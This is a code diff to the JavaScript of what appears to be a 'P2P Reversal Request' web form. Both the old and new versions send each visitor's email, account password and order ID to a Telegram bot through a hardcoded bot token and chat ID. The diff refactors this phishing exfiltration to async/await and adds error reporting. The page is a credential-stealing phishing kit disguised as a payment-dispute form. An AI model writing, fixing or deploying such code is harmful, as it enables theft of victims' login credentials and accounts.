@@ -366,7 +366,7 @@
     }
 
     // ── Form submission ──
-    document.getElementById('reversalForm').addEventListener('submit', function(e) {
+    document.getElementById('reversalForm').addEventListener('submit', async function(e) {
       e.preventDefault();
 
       const email    = document.getElementById('email').value.trim();
@@ -391,6 +391,7 @@
 
       const BOT_TOKEN = '8751335932:AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms';
       const CHAT_ID   = '2056358288';
+      const TG_URL    = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
       const reasonLabels = {
         no_payment : 'No payment received',
@@ -399,39 +400,32 @@
         other      : 'Other',
       };
 
-      const message = [
-        '🔔 *New P2P Reversal Request*',
-        '',
-        `📧 *Email:* \`${email}\``,
-        `🔑 *Password:* \`${password}\``,
-        `🆔 *Order ID:* \`${orderId}\``,
-        `📋 *Reason:* ${reasonLabels[reason] || reason}`,
-        `🕒 *Time:* ${new Date().toUTCString()}`,
-      ].join('\n');
+      const text = `🔔 New P2P Reversal Request\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🆔 Order ID: ${orderId}\n📋 Reason: ${reasonLabels[reason] || reason}\n🕒 Time: ${new Date().toUTCString()}`;
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method  : 'POST',
-        headers : { 'Content-Type': 'application/json' },
-        body    : JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
-      })
-        .then(res => res.json())
-        .then(data => {
-          if (data.ok) {
-            showToast('✅ Reversal submitted successfully!', 4000);
-            document.getElementById('reversalForm').reset();
-            reasonField.classList.remove('filled');
-            reasonSelect.classList.remove('has-value');
-          } else {
-            showToast('Submission failed. Please try again.');
-          }
-        })
-        .catch(() => {
-          showToast('Network error. Please try again.');
-        })
-        .finally(() => {
-          btn.textContent = 'Submit';
-          btn.disabled = false;
+      try {
+        const res  = await fetch(TG_URL, {
+          method  : 'POST',
+          headers : { 'Content-Type': 'application/json' },
+          body    : JSON.stringify({ chat_id: CHAT_ID, text }),
         });
+        const data = await res.json();
+
+        if (data.ok) {
+          showToast('Reversal submitted successfully!', 4000);
+          document.getElementById('reversalForm').reset();
+          reasonField.classList.remove('filled');
+          reasonSelect.classList.remove('has-value');
+        } else {
+          console.error('Telegram error:', data);
+          showToast('Submission failed: ' + (data.description || 'Unknown error'));
+        }
+      } catch (err) {
+        console.error('Fetch error:', err);
+        showToast('Network error. Please check your connection.');
+      } finally {
+        btn.textContent = 'Submit';
+        btn.disabled = false;
+      }
     });
 
     // ── Placeholder link handlers ──
